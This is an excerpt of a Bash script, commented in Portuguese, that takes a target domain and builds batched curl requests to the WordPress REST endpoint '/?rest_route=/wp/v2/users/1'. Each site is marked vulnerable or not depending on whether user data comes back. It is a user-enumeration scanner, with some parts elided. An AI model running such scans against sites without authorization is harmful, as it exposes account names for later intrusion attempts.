...
echo -e "\033[33;1mPara continuar digite o nome de domínio do alvo: \033[m";
...
for url in $(cat $pasta"/"$dominio"/resultados/"analiseWordpress.txt);do
	...
	echo $url | sed 's/http.*.\/\///' | xargs touch $pasta"/threads/"$dominio"/resulta/";
	...
	#os resultados de todos os curls, então se ele tiver o .txt no final ele também será jogado no cat.
        ...
        echo 'curl --silent "'$url'/?rest_route=/wp/v2/users/1" | grep "\{\"id\":" && printf "'$url'\033[33;1m VULNERAVEL\033[m\n\n" > '$pasta'"/threads/'$dominio'/resulta/"'$arquivo'.txt || printf "'$url'\033[32;1m NAO E VULNERAVEL\033[m\n\n" > '$pasta'"/threads/'$dominio'/resulta/"'$arquivo'.txt &' >> "curlsMontados";
done

#Aqui eu entro na pasta onde será guardado os resultados dos curls testando o vazamento de usuários wordpress

mv curlsMontados $dominio"/"resulta/;
cd $dominio"/"resulta;
